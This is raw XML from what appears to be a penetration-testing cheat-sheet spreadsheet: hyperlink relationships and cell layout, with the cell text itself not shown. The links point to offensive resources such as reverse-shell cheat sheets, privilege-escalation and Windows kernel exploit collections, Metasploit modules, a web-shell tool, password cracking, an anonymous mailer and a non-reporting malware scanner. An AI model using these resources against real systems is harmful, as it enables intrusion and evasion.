Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nodistribute.com/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://lolbas-project.github.io/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://anonymousemail.me/send.php" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://0xsp.com/offensive/active-directory-attack-defense" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings2.bin"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/SVelizDonoso/wingkalabs" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://book.hacktricks.xyz/stego/stego-tricks" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pequalsnp-team.github.io/cheatsheet/steganography-101" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://platzi.com/tutoriales/1104-python/2292-pipenv-virtualenv-y-pip-en-un-solo-comando/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://redteams.fr/priv_escalation/" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="\" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/ngalongc/AutoLocalPrivilegeEscalation" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.hybrid-analysis.com/?lang=es"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hunter.io/domain-search" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.robtex.com/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hunter.io/" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings3.bin"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ipv4info.com/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sitereport.netcraft.com/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://namechk.com/" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ciberpatrulla.com/links" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://checkusernames.com/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://osintframework.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://whois.domaintools.com/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://viewdns.info/" TargetMode="Externa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tools.kali.org/information-gathering/smtp-user-enum" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/DominicBreuker/pspy"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jesux.es/cracking/passwords-cracking/" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ohpe.it/juicy-potato/CLSID/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rasta-mouse/Watson" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hashcat.net/wiki/doku.php?id=hashcat" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/SecWiki/windows-kernel-exploits" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rebootuser/LinEnum" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/pablogonzalezpe/metasploit-framework/tree/master/modules/exploits" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.securityartwork.es/2017/02/15/cracking-contrasenas-hashcat/" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/quentinhardy/odat" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hashcat.net/wiki/doku.php?id=example_hashes" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/jivoi/pentest/tree/master/exploit_win" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf" TargetMode="External"/><Relationship Id="rId14"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epinna/weevely3"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29a.ch/photo-forensics/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://fotoforensics.com/"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B1:V36"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="V2" sqref="V2"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultRowHeight="15"/>
  <cols>
    <col min="1" max="1" width="0.42578125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:22" ht="15" customHeight="1">
      <c r="B1" s="65" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="66"/>
      <c r="D1" s="67"/>
      <c r="E1" s="54" t="s">
        <v>854</v>
      </c>
      <c r="F1" s="54" t="s">
        <v>854</v>
      </c>
      <c r="G1" s="54" t="s">
        <v>857</v>
      </c>
      <c r="H1" s="54" t="s">
        <v>857</v>
      </c>
    </row>
    <row r="2" spans="2:22">
      <c r="B2" s="68"/>
      <c r="C2" s="69"/>
      <c r="D2" s="70"/>
      <c r="E2" t="str">
        <f>E$1&amp;A2&amp;F$1</f>
        <v>``````</v>
      </c>
      <c r="V2" t="s">
        <v>855</v>
      </c>
    </row>
    <row r="3" spans="2:22" ht="18.75">
      <c r="B3" s="1"/>
      <c r="C3" s="2"/>
      <c r="D3" s="3"/>
      <c r="N3" t="s">
        <v>618</v>
      </c>
      <c r="V3" t="s">
        <v>856</v>
      </c>
    </row>
    <row r="4" spans="2:22" ht="18.75">
      <c r="B4" s="1"/>
      <c r="C4" s="2"/>
      <c r="D4" s="3"/>
      <c r="N4" t="s">
        <v>619</v>
      </c>
    </row>
    <row r="5" spans="2:22" ht="18.75">
      <c r="B5" s="1"/>
      <c r="C5" s="2"/>
      <c r="D5" s="3"/>
    </row>
    <row r="6" spans="2:22" ht="18.75">
      <c r="B6" s="1"/>
      <c r="C6" s="2"/>
      <c r="D6" s="3"/>
    </row>
    <row r="7" spans="2:22" ht="18.75">
      <c r="B7" s="1"/>
      <c r="C7" s="2"/>
      <c r="D7" s="3"/>
      <c r="F7" t="s">
        <v>436</v>
      </c>
    </row>
    <row r="8" spans="2:22" ht="18.75">
      <c r="B8" s="1"/>
      <c r="C8" s="2"/>
      <c r="D8" s="3"/>
      <c r="F8" t="s">
        <v>437</v>
      </c>
    </row>
    <row r="9" spans="2:22" ht="18.75">
      <c r="B9" s="1"/>
      <c r="C9" s="2"/>
      <c r="D9" s="3"/>
    </row>
    <row r="10" spans="2:22" ht="18.75">
      <c r="B10" s="1"/>
      <c r="C10" s="2"/>
      <c r="D10" s="3"/>
      <c r="F10" s="42" t="s">
        <v>438</v>
      </c>
    </row>
    <row r="11" spans="2:22" ht="18.75">
      <c r="B11" s="1"/>
      <c r="C11" s="2"/>
      <c r="D11" s="3"/>
    </row>
    <row r="12" spans="2:22" ht="18.75">
      <c r="B12" s="1"/>
      <c r="C12" s="2"/>
      <c r="D12" s="3"/>
    </row>
    <row r="13" spans="2:22" ht="18.75">
      <c r="B13" s="1"/>
      <c r="C13" s="2"/>
      <c r="D13" s="3"/>
      <c r="F13" t="s">
        <v>547</v>
      </c>
      <c r="M13" t="s">
        <v>553</v>
      </c>
    </row>
    <row r="14" spans="2:22" ht="18.75">
      <c r="B14" s="1"/>
      <c r="C14" s="2"/>
      <c r="D14" s="3"/>
      <c r="F14" t="s">
        <v>548</v>
      </c>
      <c r="M14" t="s">
        <v>554</v>
      </c>
    </row>
    <row r="15" spans="2:22" ht="18.75">
      <c r="B15" s="1"/>
      <c r="C15" s="2"/>
      <c r="D15" s="3"/>
      <c r="F15" t="s">
        <v>549</v>
      </c>
      <c r="M15" t="s">
        <v>555</v>
      </c>
    </row>
    <row r="16" spans="2:22">
      <c r="B16" s="4"/>
      <c r="C16" s="5"/>
      <c r="D16" s="6"/>
      <c r="F16" t="s">
        <v>550</v>
      </c>
      <c r="M16" t="s">
        <v>556</v>
      </c>
    </row>
    <row r="17" spans="2:13">
      <c r="B17" s="4"/>
      <c r="C17" s="5"/>
      <c r="D17" s="6"/>
      <c r="F17" t="s">
        <v>551</v>
      </c>
      <c r="M17" t="s">
        <v>557</v>
      </c>
    </row>
    <row r="18" spans="2:13" ht="19.5" thickBot="1">
      <c r="B18" s="7"/>
      <c r="C18" s="8"/>
      <c r="D18" s="9"/>
      <c r="F18" t="s">
        <v>552</v>
      </c>
      <c r="M18" t="s">
        <v>557</v>
      </c>
    </row>
    <row r="19" spans="2:13">
      <c r="M19" t="s">
        <v>558</v>
      </c>
    </row>
    <row r="21" spans="2:13">
      <c r="M21" t="s">
        <v>637</v>
      </c>
    </row>
    <row r="29" spans="2:13">
      <c r="F29" t="s">
        <v>610</v>
      </c>
    </row>
    <row r="31" spans="2:13">
      <c r="F31" t="s">
        <v>611</v>
      </c>
    </row>
    <row r="33" spans="6:6">
      <c r="F33" t="s">
        <v>612</v>
      </c>
    </row>
    <row r="35" spans="6:6">
      <c r="F35" t="s">
        <v>613</v>
      </c>
    </row>
    <row r="36" spans="6:6">
      <c r="F36" t="s">
        <v>614</v>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="B1:D2"/>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neral">
                <anchor moveWithCells="1" sizeWithCells="1">
                  <from>
                    <xdr:col>1</xdr:col>
                    <xdr:colOff>28575</xdr:colOff>
                    <xdr:row>2</xdr:row>
                    <xdr:rowOff>47625</xdr:rowOff>
                  </from>
                  <to>
                    <xdr:col>3</xdr:col>
                    <xdr:colOff>714375</xdr:colOff>
                    <xdr:row>4</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AB100"/>
  <sheetViews>
    <sheetView topLeftCell="A26" workbookViewId="0">
      <selection activeCell="Z26" sqref="Z26:AB26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultRowHeight="15"/>
  <cols>
    <col min="1" max="1" width="0.42578125" customWidth="1"/>
    <col min="2" max="4" width="15.7109375" customWidth="1"/>
    <col min="6" max="8" width="15.7109375" customWidth="1"/>
    <col min="10" max="12" width="15.7109375" customWidth="1"/>
    <col min="14" max="16" width="15.7109375" customWidth="1"/>
    <col min="18" max="20" width="15.7109375" customWidth="1"/>
    <col min="22" max="24" width="15.7109375" style="36" customWidth="1"/>
    <col min="26" max="28" width="15.7109375" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="2:28" ht="15" customHeight="1">
      <c r="B1" s="65" t="s">
        <v>0</v>
      </c>
      <c r="C1" s="66"/>
      <c r="D1" s="67"/>
    </row>
    <row r="2" spans="2:28" ht="15.75" customHeight="1" thickBot="1">
      <c r="B2" s="68"/>
      <c r="C2" s="69"/>
      <c r="D2" s="70"/>
      <c r="F2" s="72" t="s">
        <v>10</v>
      </c>
      <c r="G2" s="72"/>
      <c r="H2" s="72"/>
      <c r="J2" s="72" t="s">
        <v>122</v>
      </c>
      <c r="K2" s="72"/>
      <c r="L2" s="72"/>
      <c r="N2" s="72" t="s">
        <v>189</v>
      </c>
      <c r="O2" s="72"/>
      <c r="P2" s="72"/>
      <c r="R2" s="72" t="s">
        <v>410</v>
      </c>
      <c r="S2" s="72"/>
      <c r="T2" s="72"/>
      <c r="V2" s="71" t="s">
        <v>440</v>
      </c>
      <c r="W2" s="71"/>
      <c r="X2" s="71"/>
      <c r="Z2" s="71" t="s">
        <v>528</v>
      </c>
      <c r="AA2" s="71"/>
      <c r="AB2" s="71"/>
    </row>
    <row r="3" spans="2:28" ht="18.75">
      <c r="B3" s="1"/>
      <c r="C3" s="2"/>
      <c r="D3" s="3"/>
      <c r="F3" s="14" t="s">
        <v>1</v>
      </c>
      <c r="G3" s="16" t="s">
        <v>2</v>
      </c>
      <c r="H3" s="10" t="s">
        <v>3</v>
      </c>
      <c r="J3" s="14" t="s">
        <v>27</v>
      </c>
      <c r="K3" s="16" t="s">
        <v>2</v>
      </c>
      <c r="L3" s="10" t="s">
        <v>3</v>
      </c>
      <c r="N3" s="14" t="s">
        <v>187</v>
      </c>
      <c r="O3" s="16" t="s">
        <v>2</v>
      </c>
      <c r="P3" s="10" t="s">
        <v>3</v>
      </c>
      <c r="R3" s="14" t="s">
        <v>409</v>
      </c>
      <c r="S3" s="16" t="s">
        <v>2</v>
      </c>
      <c r="T3" s="10" t="s">
        <v>3</v>
      </c>
      <c r="V3" s="37" t="s">
        <v>187</v>
      </c>
      <c r="W3" s="43" t="s">
        <v>2</v>
      </c>
      <c r="X3" s="39" t="s">
        <v>3</v>
      </c>
      <c r="Z3" s="37" t="s">
        <v>1042</v>
      </c>
      <c r="AA3" s="43" t="s">
        <v>2</v>
      </c>
      <c r="AB3" s="39" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="4" spans="2:28" ht="90" customHeight="1">
      <c r="B4" s="1"/>
      <c r="C4" s="2"/>
      <c r="D4" s="3"/>
      <c r="F4" s="15" t="s">
        <v>4</v>
      </c>
      <c r="G4" s="19" t="s">
        <v>5</v>
      </c>
      <c r="H4" s="11"/>
      <c r="J4" s="15" t="s">
        <v>28</v>
      </c>
      <c r="K4" s="19" t="s">
        <v>945</v>
      </c>
      <c r="L4" s="11" t="s">
        <v>29</v>
      </c>
      <c r="N4" s="15" t="s">
        <v>188</v>
      </c>
      <c r="O4" s="19" t="s">
        <v>190</v>
      </c>
      <c r="P4" s="12" t="s">
        <v>191</v>
      </c>
      <c r="R4" s="15" t="s">
        <v>408</v>
      </c>
      <c r="S4" s="19" t="s">
        <v>997</v>
      </c>
      <c r="T4" s="12" t="s">
        <v>412</v>
      </c>
      <c r="V4" s="15" t="s">
        <v>441</v>
      </c>
      <c r="W4" s="19" t="s">
        <v>442</v>
      </c>
      <c r="X4" s="12" t="s">
        <v>443</v>
      </c>
      <c r="Z4" s="15" t="s">
        <v>529</v>
      </c>
      <c r="AA4" s="19" t="s">
        <v>1038</v>
      </c>
      <c r="AB4" s="12"/>
    </row>
    <row r="5" spans="2:28" ht="135">
      <c r="B5" s="1"/>
      <c r="C5" s="2"/>
      <c r="D5" s="3"/>
      <c r="F5" s="17" t="s">
        <v>6</v>
      </c>
      <c r="G5" s="20" t="s">
        <v>11</v>
      </c>
      <c r="H5" s="18"/>
      <c r="J5" s="17" t="s">
        <v>30</v>
      </c>
      <c r="K5" s="20" t="s">
        <v>31</v>
      </c>
      <c r="L5" s="18" t="s">
        <v>402</v>
      </c>
      <c r="N5" s="17" t="s">
        <v>192</v>
      </c>
      <c r="O5" s="20" t="s">
        <v>193</v>
      </c>
      <c r="P5" s="18"/>
      <c r="R5" s="17" t="s">
        <v>411</v>
      </c>
      <c r="S5" s="20" t="s">
        <v>998</v>
      </c>
      <c r="T5" s="18" t="s">
        <v>413</v>
      </c>
      <c r="V5" s="17" t="s">
        <v>444</v>
      </c>
      <c r="W5" s="20" t="s">
        <v>445</v>
      </c>
      <c r="X5" s="18"/>
      <c r="Z5" s="17" t="s">
        <v>531</v>
      </c>
      <c r="AA5" s="20" t="s">
        <v>1039</v>
      </c>
      <c r="AB5" s="18" t="s">
        <v>530</v>
      </c>
    </row>
    <row r="6" spans="2:28" ht="101.25">
      <c r="B6" s="1"/>
      <c r="C6" s="2"/>
      <c r="D6" s="3"/>
      <c r="F6" s="15" t="s">
        <v>7</v>
      </c>
      <c r="G6" s="21" t="s">
        <v>12</v>
      </c>
      <c r="H6" s="12"/>
      <c r="J6" s="15" t="s">
        <v>167</v>
      </c>
      <c r="K6" s="21" t="s">
        <v>168</v>
      </c>
      <c r="L6" s="12" t="s">
        <v>947</v>
      </c>
      <c r="N6" s="15" t="s">
        <v>559</v>
      </c>
      <c r="O6" s="21" t="s">
        <v>987</v>
      </c>
      <c r="P6" s="12" t="s">
        <v>989</v>
      </c>
      <c r="R6" s="15" t="s">
        <v>414</v>
      </c>
      <c r="S6" s="21" t="s">
        <v>999</v>
      </c>
      <c r="T6" s="12"/>
      <c r="V6" s="15" t="s">
        <v>446</v>
      </c>
      <c r="W6" s="21" t="s">
        <v>1016</v>
      </c>
      <c r="X6" s="12"/>
      <c r="Z6" s="15" t="s">
        <v>573</v>
      </c>
      <c r="AA6" s="21"/>
      <c r="AB6" s="12"/>
    </row>
    <row r="7" spans="2:28" ht="101.25">
      <c r="B7" s="1"/>
      <c r="C7" s="2"/>
      <c r="D7" s="3"/>
      <c r="F7" s="17" t="s">
        <v>8</v>
      </c>
      <c r="G7" s="20" t="s">
        <v>860</v>
      </c>
      <c r="H7" s="18"/>
      <c r="J7" s="17" t="s">
        <v>169</v>
      </c>
      <c r="K7" s="20" t="s">
        <v>946</v>
      </c>
      <c r="L7" s="18"/>
      <c r="N7" s="17" t="s">
        <v>651</v>
      </c>
      <c r="O7" s="20" t="s">
        <v>988</v>
      </c>
      <c r="P7" s="18" t="s">
        <v>652</v>
      </c>
      <c r="R7" s="17" t="s">
        <v>415</v>
      </c>
      <c r="S7" s="20" t="s">
        <v>1000</v>
      </c>
      <c r="T7" s="18" t="s">
        <v>416</v>
      </c>
      <c r="V7" s="17" t="s">
        <v>447</v>
      </c>
      <c r="W7" s="20" t="s">
        <v>1017</v>
      </c>
      <c r="X7" s="18" t="s">
        <v>1018</v>
      </c>
      <c r="Z7" s="17" t="s">
        <v>574</v>
      </c>
      <c r="AA7" s="20"/>
      <c r="AB7" s="18"/>
    </row>
    <row r="8" spans="2:28" ht="123.75">
      <c r="B8" s="1"/>
      <c r="C8" s="2"/>
      <c r="D8" s="3"/>
      <c r="F8" s="15" t="s">
        <v>9</v>
      </c>
      <c r="G8" s="21" t="s">
        <v>13</v>
      </c>
      <c r="H8" s="12"/>
      <c r="J8" s="15" t="s">
        <v>171</v>
      </c>
      <c r="K8" s="21" t="s">
        <v>172</v>
      </c>
      <c r="L8" s="12"/>
      <c r="N8" s="15" t="s">
        <v>1394</v>
      </c>
      <c r="O8" s="21" t="s">
        <v>1396</v>
      </c>
      <c r="P8" s="12" t="s">
        <v>1395</v>
      </c>
      <c r="R8" s="15" t="s">
        <v>602</v>
      </c>
      <c r="S8" s="21" t="s">
        <v>1001</v>
      </c>
      <c r="T8" s="12"/>
      <c r="V8" s="15" t="s">
        <v>448</v>
      </c>
      <c r="W8" s="21" t="s">
        <v>1019</v>
      </c>
      <c r="X8" s="12"/>
      <c r="Z8" s="15" t="s">
        <v>575</v>
      </c>
      <c r="AA8" s="21" t="s">
        <v>1040</v>
      </c>
      <c r="AB8" s="12"/>
    </row>
    <row r="9" spans="2:28" ht="68.25" thickBot="1">
      <c r="B9" s="1"/>
      <c r="C9" s="2"/>
      <c r="D9" s="3"/>
      <c r="F9" s="17" t="s">
        <v>14</v>
      </c>
      <c r="G9" s="20" t="s">
        <v>861</v>
      </c>
      <c r="H9" s="18"/>
      <c r="J9" s="22" t="s">
        <v>174</v>
      </c>
      <c r="K9" s="23" t="s">
        <v>175</v>
      </c>
      <c r="L9" s="24" t="s">
        <v>173</v>
      </c>
      <c r="N9" s="17" t="s">
        <v>1456</v>
      </c>
      <c r="O9" s="20" t="s">
        <v>1461</v>
      </c>
      <c r="P9" s="18"/>
      <c r="R9" s="17" t="s">
        <v>769</v>
      </c>
      <c r="S9" s="20" t="s">
        <v>770</v>
      </c>
      <c r="T9" s="18"/>
      <c r="V9" s="17" t="s">
        <v>449</v>
      </c>
      <c r="W9" s="20" t="s">
        <v>450</v>
      </c>
      <c r="X9" s="18" t="s">
        <v>1020</v>
      </c>
      <c r="Z9" s="17" t="s">
        <v>630</v>
      </c>
      <c r="AA9" s="20" t="s">
        <v>633</v>
      </c>
      <c r="AB9" s="18"/>
    </row>
    <row r="10" spans="2:28" ht="67.5">
      <c r="B10" s="1"/>
      <c r="C10" s="2"/>
      <c r="D10" s="3"/>
      <c r="F10" s="15" t="s">
        <v>23</v>
      </c>
      <c r="G10" s="21" t="s">
        <v>858</v>
      </c>
      <c r="H10" s="12" t="s">
        <v>859</v>
      </c>
      <c r="N10" s="15" t="s">
        <v>1457</v>
      </c>
      <c r="O10" s="21" t="s">
        <v>1464</v>
      </c>
      <c r="P10" s="12"/>
      <c r="R10" s="15" t="s">
        <v>1521</v>
      </c>
      <c r="S10" s="21" t="s">
        <v>1522</v>
      </c>
      <c r="T10" s="12" t="s">
        <v>1523</v>
      </c>
      <c r="V10" s="15" t="s">
        <v>456</v>
      </c>
      <c r="W10" s="21" t="s">
        <v>1021</v>
      </c>
      <c r="X10" s="12"/>
      <c r="Z10" s="15" t="s">
        <v>631</v>
      </c>
      <c r="AA10" s="21"/>
      <c r="AB10" s="12"/>
    </row>
    <row r="11" spans="2:28" ht="68.25" thickBot="1">
      <c r="B11" s="1"/>
      <c r="C11" s="2"/>
      <c r="D11" s="3"/>
      <c r="F11" s="17" t="s">
        <v>127</v>
      </c>
      <c r="G11" s="20" t="s">
        <v>128</v>
      </c>
      <c r="H11" s="18"/>
      <c r="J11" s="72" t="s">
        <v>121</v>
      </c>
      <c r="K11" s="72"/>
      <c r="L11" s="72"/>
      <c r="N11" s="17" t="s">
        <v>1458</v>
      </c>
      <c r="O11" s="20" t="s">
        <v>1462</v>
      </c>
      <c r="P11" s="18"/>
      <c r="R11" s="45" t="s">
        <v>1625</v>
      </c>
      <c r="S11" s="46" t="s">
        <v>1626</v>
      </c>
      <c r="T11" s="18"/>
      <c r="V11" s="17" t="s">
        <v>451</v>
      </c>
      <c r="W11" s="20" t="s">
        <v>1022</v>
      </c>
      <c r="X11" s="18"/>
      <c r="Z11" s="17" t="s">
        <v>632</v>
      </c>
      <c r="AA11" s="20"/>
      <c r="AB11" s="18"/>
    </row>
    <row r="12" spans="2:28" ht="56.25">
      <c r="B12" s="1"/>
      <c r="C12" s="2"/>
      <c r="D12" s="3"/>
      <c r="F12" s="15" t="s">
        <v>177</v>
      </c>
      <c r="G12" s="21" t="s">
        <v>178</v>
      </c>
      <c r="H12" s="12"/>
      <c r="J12" s="14" t="s">
        <v>1</v>
      </c>
      <c r="K12" s="16" t="s">
        <v>2</v>
      </c>
      <c r="L12" s="10" t="s">
        <v>3</v>
      </c>
      <c r="N12" s="15" t="s">
        <v>1459</v>
      </c>
      <c r="O12" s="21" t="s">
        <v>1465</v>
      </c>
      <c r="P12" s="12"/>
      <c r="R12" s="15" t="s">
        <v>1754</v>
      </c>
      <c r="S12" s="21" t="s">
        <v>1755</v>
      </c>
      <c r="T12" s="12"/>
      <c r="V12" s="15" t="s">
        <v>452</v>
      </c>
      <c r="W12" s="21" t="s">
        <v>1023</v>
      </c>
      <c r="X12" s="12"/>
      <c r="Z12" s="15" t="s">
        <v>678</v>
      </c>
      <c r="AA12" s="21" t="s">
        <v>1041</v>
      </c>
      <c r="AB12" s="12"/>
    </row>
    <row r="13" spans="2:28" ht="101.25">
      <c r="B13" s="1"/>
      <c r="C13" s="2"/>
      <c r="D13" s="3"/>
      <c r="F13" s="17" t="s">
        <v>1801</v>
      </c>
      <c r="G13" s="20" t="s">
        <v>1802</v>
      </c>
      <c r="H13" s="18"/>
      <c r="J13" s="15" t="s">
        <v>83</v>
      </c>
      <c r="K13" s="19" t="s">
        <v>948</v>
      </c>
      <c r="L13" s="11" t="s">
        <v>954</v>
      </c>
      <c r="N13" s="17" t="s">
        <v>1460</v>
      </c>
      <c r="O13" s="20" t="s">
        <v>1463</v>
      </c>
      <c r="P13" s="18"/>
      <c r="R13" s="45" t="s">
        <v>1768</v>
      </c>
      <c r="S13" s="46" t="s">
        <v>1769</v>
      </c>
      <c r="T13" s="18"/>
      <c r="V13" s="17" t="s">
        <v>457</v>
      </c>
      <c r="W13" s="20" t="s">
        <v>1024</v>
      </c>
      <c r="X13" s="18"/>
      <c r="Z13" s="17" t="s">
        <v>754</v>
      </c>
      <c r="AA13" s="20"/>
      <c r="AB13" s="18"/>
    </row>
    <row r="14" spans="2:28" ht="45">
      <c r="B14" s="1"/>
      <c r="C14" s="2"/>
      <c r="D14" s="3"/>
      <c r="F14" s="15" t="s">
        <v>534</v>
      </c>
      <c r="G14" s="21" t="s">
        <v>862</v>
      </c>
      <c r="H14" s="12"/>
      <c r="J14" s="17" t="s">
        <v>82</v>
      </c>
      <c r="K14" s="20" t="s">
        <v>949</v>
      </c>
      <c r="L14" s="18" t="s">
        <v>953</v>
      </c>
      <c r="N14" s="15" t="s">
        <v>1491</v>
      </c>
      <c r="O14" s="21" t="s">
        <v>1492</v>
      </c>
      <c r="P14" s="12" t="s">
        <v>1493</v>
      </c>
      <c r="V14" s="15" t="s">
        <v>458</v>
      </c>
      <c r="W14" s="21" t="s">
        <v>1025</v>
      </c>
      <c r="X14" s="12"/>
      <c r="Z14" s="15" t="s">
        <v>755</v>
      </c>
      <c r="AA14" s="21"/>
      <c r="AB14" s="12"/>
    </row>
    <row r="15" spans="2:28" ht="63">
      <c r="B15" s="1"/>
      <c r="C15" s="2"/>
      <c r="D15" s="3"/>
      <c r="F15" s="17" t="s">
        <v>430</v>
      </c>
      <c r="G15" s="20" t="s">
        <v>863</v>
      </c>
      <c r="H15" s="30" t="s">
        <v>864</v>
      </c>
      <c r="J15" s="15" t="s">
        <v>84</v>
      </c>
      <c r="K15" s="21" t="s">
        <v>950</v>
      </c>
      <c r="L15" s="12"/>
      <c r="V15" s="17" t="s">
        <v>667</v>
      </c>
      <c r="W15" s="20" t="s">
        <v>1026</v>
      </c>
      <c r="X15" s="18" t="s">
        <v>1027</v>
      </c>
      <c r="Z15" s="17" t="s">
        <v>756</v>
      </c>
      <c r="AA15" s="20"/>
      <c r="AB15" s="18"/>
    </row>
    <row r="16" spans="2:28" ht="84.75" thickBot="1">
      <c r="B16" s="1"/>
      <c r="C16" s="2"/>
      <c r="D16" s="3"/>
      <c r="F16" s="15" t="s">
        <v>459</v>
      </c>
      <c r="G16" s="21" t="s">
        <v>460</v>
      </c>
      <c r="H16" s="12"/>
      <c r="J16" s="17" t="s">
        <v>134</v>
      </c>
      <c r="K16" s="20" t="s">
        <v>135</v>
      </c>
      <c r="L16" s="18" t="s">
        <v>952</v>
      </c>
      <c r="R16" s="72" t="s">
        <v>422</v>
      </c>
      <c r="S16" s="72"/>
      <c r="T16" s="72"/>
      <c r="V16" s="15" t="s">
        <v>668</v>
      </c>
      <c r="W16" s="21" t="s">
        <v>1028</v>
      </c>
      <c r="X16" s="18" t="s">
        <v>1027</v>
      </c>
      <c r="Z16" s="15" t="s">
        <v>1512</v>
      </c>
      <c r="AA16" s="21" t="s">
        <v>1514</v>
      </c>
      <c r="AB16" s="12" t="s">
        <v>1513</v>
      </c>
    </row>
    <row r="17" spans="2:28" ht="101.25">
      <c r="B17" s="1"/>
      <c r="C17" s="2"/>
      <c r="D17" s="3"/>
      <c r="F17" s="17" t="s">
        <v>461</v>
      </c>
      <c r="G17" s="20" t="s">
        <v>463</v>
      </c>
      <c r="H17" s="18"/>
      <c r="J17" s="15" t="s">
        <v>524</v>
      </c>
      <c r="K17" s="21" t="s">
        <v>951</v>
      </c>
      <c r="L17" s="12" t="s">
        <v>572</v>
      </c>
      <c r="R17" s="14" t="s">
        <v>187</v>
      </c>
      <c r="S17" s="16" t="s">
        <v>2</v>
      </c>
      <c r="T17" s="10" t="s">
        <v>3</v>
      </c>
      <c r="V17" s="17" t="s">
        <v>669</v>
      </c>
      <c r="W17" s="20" t="s">
        <v>1029</v>
      </c>
      <c r="X17" s="18"/>
      <c r="Z17" s="17" t="s">
        <v>1515</v>
      </c>
      <c r="AA17" s="20" t="s">
